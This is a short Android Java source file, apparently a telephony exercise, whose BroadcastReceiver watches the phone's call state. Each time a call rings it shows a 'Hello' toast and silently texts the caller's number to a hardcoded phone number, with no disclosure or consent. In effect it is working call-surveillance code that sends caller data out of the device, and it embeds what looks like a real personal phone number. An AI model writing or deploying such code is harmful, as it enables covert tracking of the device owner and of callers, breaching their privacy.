package com.nnk.br1;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class MyReceiver extends BroadcastReceiver {

    Context context;
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        TelephonyManager  tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        tm.listen(new MyPhoneState(),PhoneStateListener.LISTEN_CALL_STATE);
    }
    public class MyPhoneState extends PhoneStateListener{
        public void onCallStateChanged(int state, String incomingNumber)
        {
            super.onCallStateChanged(state, incomingNumber);
            if (state == TelephonyManager.CALL_STATE_RINGING)
            {
                Toast.makeText(context, "Hello", Toast.LENGTH_SHORT).show();
                String mess = "Hello U r Friend Got a Incoming Call From "+incomingNumber;
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage("+919493690610",null,mess,null,null);
            }
        }
    }
}

